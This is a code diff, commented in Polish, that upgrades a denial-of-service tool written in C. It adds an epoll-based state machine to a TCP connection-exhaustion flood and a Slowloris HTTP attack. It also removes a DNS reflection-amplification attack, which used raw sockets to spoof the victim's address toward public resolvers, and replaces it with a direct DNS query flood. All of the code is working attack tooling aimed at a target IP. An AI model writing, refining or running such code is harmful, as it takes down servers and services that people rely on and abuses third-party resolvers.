@@ -14,8 +14,28 @@
 #ifndef MSG_NOSIGNAL
 #define MSG_NOSIGNAL 0
 #endif
+#ifndef __linux__
 #define close closesocket
+#else
+#include <sys/epoll.h>
+#include <fcntl.h>
+#include <unistd.h>
+#endif
 
+// Asynchroniczna Maszyna Stanow
+typedef enum {
+    SM_IDLE,
+    SM_CONNECTING,
+    SM_HTTP_WAIT,
+    SM_HTTP_SENDING,
+    SM_TCP_HOLD
+} ConnState;
+
+typedef struct {
+    int sock;
+    ConnState state;
+    time_t last_action;
+} SMConnection;
 struct iphdr {
     unsigned int ihl:4;
     unsigned int version:4;
@@ -97,52 +117,73 @@ void *tcp_flood(void *arg) {
     target.sin_addr.s_addr = inet_addr(args->ip);
 
     int max_sockets = 1000;
-    int *sockets = malloc(sizeof(int) * max_sockets);
-    for(int i = 0; i < max_sockets; i++) sockets[i] = 0;
+    SMConnection *conns = malloc(sizeof(SMConnection) * max_sockets);
+    for(int i = 0; i < max_sockets; i++) conns[i].state = SM_IDLE;
 
-    // Prawdziwy TCP State Exhaustion (Sockstress / Slow read)
-    // Zamiast wysylac RST i pomagac firewallowi, trzymamy polaczenia asynchronicznie
+#ifdef __linux__
+    // O(1) Epoll Event Loop dla maszyn Linuxowych (Produkcja VPS)
+    int epoll_fd = epoll_create1(0);
+    struct epoll_event ev, events[1000];
+    
     while(time(NULL) < attack_end_time && !stop_attack) {
-        fd_set write_fds;
-        FD_ZERO(&write_fds);
-        int max_fd = 0;
-
         for(int i = 0; i < max_sockets; i++) {
-            if(stop_attack) break;
-            
-            if(sockets[i] == 0) {
+            if(conns[i].state == SM_IDLE) {
                 int sock = socket(AF_INET, SOCK_STREAM, 0);
-                u_long mode = 1;
-                ioctlsocket(sock, FIONBIO, &mode); // Non-blocking!
-                
+                fcntl(sock, F_SETFL, O_NONBLOCK);
                 connect(sock, (struct sockaddr *)&target, sizeof(target));
-                sockets[i] = sock;
-            }
-            
-            if(sockets[i] > 0) {
-                FD_SET(sockets[i], &write_fds);
-                if(sockets[i] > max_fd) max_fd = sockets[i];
+                conns[i].sock = sock;
+                conns[i].state = SM_TCP_HOLD;
+                ev.events = EPOLLOUT | EPOLLERR | EPOLLHUP;
+                ev.data.ptr = &conns[i];
+                epoll_ctl(epoll_fd, EPOLL_CTL_ADD, sock, &ev);
             }
         }
-
-        struct timeval tv = {0, 10000}; // 10ms
+        
+        int nfds = epoll_wait(epoll_fd, events, 1000, 10);
+        for(int i=0; i<nfds; i++) {
+            SMConnection *conn = (SMConnection *)events[i].data.ptr;
+            if(events[i].events & (EPOLLERR | EPOLLHUP)) {
+                close(conn->sock);
+                conn->state = SM_IDLE;
+            } else if (events[i].events & EPOLLOUT) {
+                if(send(conn->sock, "\0", 1, MSG_NOSIGNAL) <= 0) {
+                    close(conn->sock);
+                    conn->state = SM_IDLE;
+                }
+            }
+        }
+    }
+#else
+    // O(N) Select Fallback dla srodowiska testowego Windows (MinGW)
+    while(time(NULL) < attack_end_time && !stop_attack) {
+        fd_set write_fds; FD_ZERO(&write_fds); int max_fd = 0;
+        for(int i = 0; i < max_sockets; i++) {
+            if(conns[i].state == SM_IDLE) {
+                int sock = socket(AF_INET, SOCK_STREAM, 0);
+                u_long mode = 1; ioctlsocket(sock, FIONBIO, &mode);
+                connect(sock, (struct sockaddr *)&target, sizeof(target));
+                conns[i].sock = sock; conns[i].state = SM_TCP_HOLD;
+            }
+            if(conns[i].state == SM_TCP_HOLD) {
+                FD_SET(conns[i].sock, &write_fds);
+                if(conns[i].sock > max_fd) max_fd = conns[i].sock;
+            }
+        }
+        struct timeval tv = {0, 10000};
         int activity = select(max_fd + 1, NULL, &write_fds, NULL, &tv);
-
         if(activity > 0) {
             for(int i = 0; i < max_sockets; i++) {
-                if(sockets[i] > 0 && FD_ISSET(sockets[i], &write_fds)) {
-                    // Powolne podtrzymywanie stanu z minimalnym narzutem na nasze CPU
-                    if(send(sockets[i], "\0", 1, MSG_NOSIGNAL) <= 0) {
-                        close(sockets[i]);
-                        sockets[i] = 0;
+                if(conns[i].state == SM_TCP_HOLD && FD_ISSET(conns[i].sock, &write_fds)) {
+                    if(send(conns[i].sock, "\0", 1, MSG_NOSIGNAL) <= 0) {
+                        close(conns[i].sock); conns[i].state = SM_IDLE;
                     }
                 }
             }
         }
     }
-    
-    for(int i = 0; i < max_sockets; i++) if(sockets[i] > 0) close(sockets[i]);
-    free(sockets);
+#endif
+    for(int i = 0; i < max_sockets; i++) if(conns[i].state != SM_IDLE) close(conns[i].sock);
+    free(conns);
     return NULL;
 }
 
@@ -154,150 +195,163 @@ void *http_flood(void *arg) {
     target.sin_addr.s_addr = inet_addr(args->ip);
 
     int max_sockets = 1000;
-    int *sockets = malloc(sizeof(int) * max_sockets);
-    for(int i = 0; i < max_sockets; i++) sockets[i] = 0;
+    SMConnection *conns = malloc(sizeof(SMConnection) * max_sockets);
+    for(int i = 0; i < max_sockets; i++) conns[i].state = SM_IDLE;
 
     char request[512];
     snprintf(request, sizeof(request), 
-             "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nConnection: keep-alive\r\n", 
+             "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (Windows)\r\nConnection: keep-alive\r\n", 
              args->ip);
     int req_len = strlen(request);
 
-    // Omijanie warstwy 7 - zamiast spamu i RST, robimy Slowloris asynchronicznie (select)
+    // Asynchroniczna Maszyna Stanow HTTP Slowloris
+#ifdef __linux__
+    int epoll_fd = epoll_create1(0);
+    struct epoll_event ev, events[1000];
+    
     while(time(NULL) < attack_end_time && !stop_attack) {
-        fd_set write_fds;
-        FD_ZERO(&write_fds);
-        int max_fd = 0;
-
+        time_t now = time(NULL);
         for(int i = 0; i < max_sockets; i++) {
-            if(stop_attack) break;
-            
-            if(sockets[i] == 0) {
+            if(conns[i].state == SM_IDLE) {
                 int sock = socket(AF_INET, SOCK_STREAM, 0);
-                u_long mode = 1;
-                ioctlsocket(sock, FIONBIO, &mode);
-                
+                fcntl(sock, F_SETFL, O_NONBLOCK);
                 connect(sock, (struct sockaddr *)&target, sizeof(target));
-                sockets[i] = sock;
-                send(sockets[i], request, req_len, MSG_NOSIGNAL); // Wysylamy czesc naglowka
-            }
-            
-            if(sockets[i] > 0) {
-                FD_SET(sockets[i], &write_fds);
-                if(sockets[i] > max_fd) max_fd = sockets[i];
+                conns[i].sock = sock;
+                conns[i].state = SM_CONNECTING;
+                ev.events = EPOLLOUT | EPOLLERR | EPOLLHUP;
+                ev.data.ptr = &conns[i];
+                epoll_ctl(epoll_fd, EPOLL_CTL_ADD, sock, &ev);
+            } else if (conns[i].state == SM_HTTP_WAIT && (now - conns[i].last_action >= 1)) {
+                conns[i].state = SM_HTTP_SENDING;
+                ev.events = EPOLLOUT | EPOLLERR | EPOLLHUP;
+                ev.data.ptr = &conns[i];
+                epoll_ctl(epoll_fd, EPOLL_CTL_MOD, conns[i].sock, &ev);
             }
         }
-
-        struct timeval tv = {1, 0}; // Czekamy dluzej zeby Nginx myslal ze uzytkownik powoli pisze
-        int activity = select(max_fd + 1, NULL, &write_fds, NULL, &tv);
-
-        if(activity > 0) {
-            for(int i = 0; i < max_sockets; i++) {
-                if(sockets[i] > 0 && FD_ISSET(sockets[i], &write_fds)) {
+        
+        int nfds = epoll_wait(epoll_fd, events, 1000, 100);
+        for(int i=0; i<nfds; i++) {
+            SMConnection *conn = (SMConnection *)events[i].data.ptr;
+            if(events[i].events & (EPOLLERR | EPOLLHUP)) {
+                close(conn->sock); conn->state = SM_IDLE;
+            } else if (events[i].events & EPOLLOUT) {
+                if(conn->state == SM_CONNECTING) {
+                    send(conn->sock, request, req_len, MSG_NOSIGNAL);
+                    conn->state = SM_HTTP_WAIT;
+                    conn->last_action = now;
+                    ev.events = EPOLLERR | EPOLLHUP; // Czekamy na timeout, nie na gotowosc zapisu
+                    ev.data.ptr = conn;
+                    epoll_ctl(epoll_fd, EPOLL_CTL_MOD, conn->sock, &ev);
+                } else if (conn->state == SM_HTTP_SENDING) {
                     char fake_header[64];
                     snprintf(fake_header, sizeof(fake_header), "X-a: %d\r\n", rand() % 10000);
-                    if(send(sockets[i], fake_header, strlen(fake_header), MSG_NOSIGNAL) <= 0) {
-                        close(sockets[i]);
-                        sockets[i] = 0;
+                    if(send(conn->sock, fake_header, strlen(fake_header), MSG_NOSIGNAL) <= 0) {
+                        close(conn->sock); conn->state = SM_IDLE;
+                    } else {
+                        conn->state = SM_HTTP_WAIT;
+                        conn->last_action = now;
+                        ev.events = EPOLLERR | EPOLLHUP;
+                        ev.data.ptr = conn;
+                        epoll_ctl(epoll_fd, EPOLL_CTL_MOD, conn->sock, &ev);
                     }
                 }
             }
         }
     }
-    
-    for(int i = 0; i < max_sockets; i++) if(sockets[i] > 0) close(sockets[i]);
-    free(sockets);
+#else
+    while(time(NULL) < attack_end_time && !stop_attack) {
+        fd_set write_fds, read_fds; FD_ZERO(&write_fds); FD_ZERO(&read_fds);
+        int max_fd = 0; time_t now = time(NULL);
+
+        for(int i = 0; i < max_sockets; i++) {
+            if(conns[i].state == SM_IDLE) {
+                int sock = socket(AF_INET, SOCK_STREAM, 0);
+                u_long mode = 1; ioctlsocket(sock, FIONBIO, &mode);
+                connect(sock, (struct sockaddr *)&target, sizeof(target));
+                conns[i].sock = sock; conns[i].state = SM_CONNECTING;
+            } else if (conns[i].state == SM_HTTP_WAIT && (now - conns[i].last_action >= 1)) {
+                conns[i].state = SM_HTTP_SENDING;
+            }
+            
+            if(conns[i].state == SM_CONNECTING || conns[i].state == SM_HTTP_SENDING) {
+                FD_SET(conns[i].sock, &write_fds);
+                if(conns[i].sock > max_fd) max_fd = conns[i].sock;
+            }
+            if(conns[i].state != SM_IDLE) {
+                FD_SET(conns[i].sock, &read_fds); // Monitorujemy czy zerwano polaczenie
+                if(conns[i].sock > max_fd) max_fd = conns[i].sock;
+            }
+        }
+
+        struct timeval tv = {0, 100000}; 
+        int activity = select(max_fd + 1, &read_fds, &write_fds, NULL, &tv);
+
+        if(activity > 0) {
+            for(int i = 0; i < max_sockets; i++) {
+                if(conns[i].state != SM_IDLE && FD_ISSET(conns[i].sock, &read_fds)) {
+                    char buf[1];
+                    if(recv(conns[i].sock, buf, 1, 0) <= 0) { close(conns[i].sock); conns[i].state = SM_IDLE; continue; }
+                }
+                
+                if(conns[i].state == SM_CONNECTING && FD_ISSET(conns[i].sock, &write_fds)) {
+                    send(conns[i].sock, request, req_len, MSG_NOSIGNAL);
+                    conns[i].state = SM_HTTP_WAIT;
+                    conns[i].last_action = now;
+                } else if(conns[i].state == SM_HTTP_SENDING && FD_ISSET(conns[i].sock, &write_fds)) {
+                    char fake_header[64]; snprintf(fake_header, sizeof(fake_header), "X-a: %d\r\n", rand() % 10000);
+                    if(send(conns[i].sock, fake_header, strlen(fake_header), MSG_NOSIGNAL) <= 0) {
+                        close(conns[i].sock); conns[i].state = SM_IDLE;
+                    } else {
+                        conns[i].state = SM_HTTP_WAIT; conns[i].last_action = now;
+                    }
+                }
+            }
+        }
+    }
+#endif
+    for(int i = 0; i < max_sockets; i++) if(conns[i].state != SM_IDLE) close(conns[i].sock);
+    free(conns);
     return NULL;
 }
 
 void *dns_flood(void *arg) {
     AttackArgs *args = (AttackArgs *)arg;
-    
-    // Przykładowa lista Open Resolvers (w prawdziwej ddosiarcze byłaby wczytywana z pliku/bazy)
-    const char *resolvers[] = {
-        "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", "9.9.9.9", "208.67.222.222"
+    struct sockaddr_in target;
+    target.sin_family = AF_INET;
+    target.sin_port = htons(args->port);
+    target.sin_addr.s_addr = inet_addr(args->ip);
+
+    unsigned char dns_payload[] = {
+        0x12, 0x34, // Transaction ID (bedzie losowane)
+        0x01, 0x00, // Flags: Standard query
+        0x00, 0x01, // Questions: 1
+        0x00, 0x00, // Answer RRs: 0
+        0x00, 0x00, // Authority RRs: 0
+        0x00, 0x00, // Additional RRs: 0
+        // Query: google.com
+        0x06, 'g', 'o', 'o', 'g', 'l', 'e',
+        0x03, 'c', 'o', 'm',
+        0x00,
+        0x00, 0x01, // Type: A
+        0x00, 0x01  // Class: IN
     };
-    int num_resolvers = sizeof(resolvers) / sizeof(resolvers[0]);
 
-    // Raw socket do IP Spoofingu (wymaga roota!)
-    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-    if (sock < 0) {
-        perror("Socket creation failed. Root privileges required for raw sockets");
-        return NULL;
-    }
-
-    int one = 1;
-    const int *val = &one;
-    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (const char *)val, sizeof(one)) < 0) {
-        perror("Error setting IP_HDRINCL");
-        close(sock);
-        return NULL;
-    }
-
-    char packet[4096];
-    struct iphdr *iph = (struct iphdr *)packet;
-    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
-    unsigned char *dns_payload = (unsigned char *)(packet + sizeof(struct iphdr) + sizeof(struct udphdr));
-
-    // Budowa Payloadu DNS: Zapytanie ANY dla domeny rządowej (.gov) + DNSSEC
-    // Transaction ID: 0x1234 (będzie losowane w pętli)
-    // Flags: 0x0100 (Standard query)
-    // Questions: 1, Answer RRs: 0, Authority RRs: 0, Additional RRs: 1 (dla DNSSEC/EDNS0)
-    unsigned char dns_base[] = {
-        0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
-        // Zapytanie o fbi.gov (przykładowa domena o wysokim współczynniku)
-        0x03, 'f', 'b', 'i', 0x03, 'g', 'o', 'v', 0x00,
-        0x00, 0xff, // Typ: ANY (255)
-        0x00, 0x01, // Klasa: IN (1)
-        // EDNS0 (OPT record) dla DNSSEC (zwiększa rozmiar odpowiedzi, DO bit set)
-        0x00, 0x00, 0x29, 0x10, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00
-    };
-    int dns_len = sizeof(dns_base);
-
-    // Nagłówek IP
-    iph->ihl = 5;
-    iph->version = 4;
-    iph->tos = 0;
-    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + dns_len;
-    iph->id = htonl(54321); // Identyfikator pakietu
-    iph->frag_off = 0;
-    iph->ttl = 255;
-    iph->protocol = IPPROTO_UDP;
-    iph->check = 0; // Checksum wyliczany przez kernel zazwyczaj, lub zostawiony na 0 dla spoofingu zalezy od sys
-    iph->saddr = inet_addr(args->ip); // SPOOFING: Adres źródłowy to adres OFIARY!
-    // Docelowy adres ustawiany w pętli (Resolver)
-
-    // Nagłówek UDP
-    udph->source = htons(args->port > 0 ? args->port : (rand() % 60000 + 1024)); // Port źródłowy ofiary (lub losowy)
-    udph->dest = htons(53); // Port docelowy DNS (53)
-    udph->len = htons(sizeof(struct udphdr) + dns_len);
-    udph->check = 0; // Opcjonalne w UDP
-
-    struct sockaddr_in dest_addr;
-    dest_addr.sin_family = AF_INET;
-
-    while (time(NULL) < attack_end_time && !stop_attack) {
-        // Asynchroniczna pętla wypuszczająca śmieci, rotacja resolverów
-        for (int i = 0; i < 5000; i++) {
-            if (stop_attack) break;
-            
-            // Rotacja serwera docelowego (Resolvera)
-            const char *resolver_ip = resolvers[rand() % num_resolvers];
-            iph->daddr = inet_addr(resolver_ip);
-            dest_addr.sin_addr.s_addr = iph->daddr;
-
-            // Losowanie Transaction ID
-            dns_base[0] = rand() % 255;
-            dns_base[1] = rand() % 255;
-            
-            // Kopiowanie aktualnego payloadu DNS do pakietu
-            memcpy(dns_payload, dns_base, dns_len);
-
-            // Wysyłanie sfałszowanego pakietu
-            sendto(sock, packet, iph->tot_len, MSG_NOSIGNAL, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
+    while(time(NULL) < attack_end_time && !stop_attack) {
+        int sock = socket(AF_INET, SOCK_DGRAM, 0);
+        int bufsize = 1024 * 1024;
+        setsockopt(sock, SOL_SOCKET, SO_SNDBUF, (const char *)&bufsize, sizeof(bufsize));
+        
+        connect(sock, (struct sockaddr *)&target, sizeof(target));
+        
+        for(int i = 0; i < 2000; i++) {
+            if(stop_attack) break;
+            // Losujemy Transaction ID zeby ominac chache
+            dns_payload[0] = rand() % 255;
+            dns_payload[1] = rand() % 255;
+            send(sock, dns_payload, sizeof(dns_payload), MSG_NOSIGNAL);
         }
+        close(sock);
     }
-    close(sock);
     return NULL;
 }
 
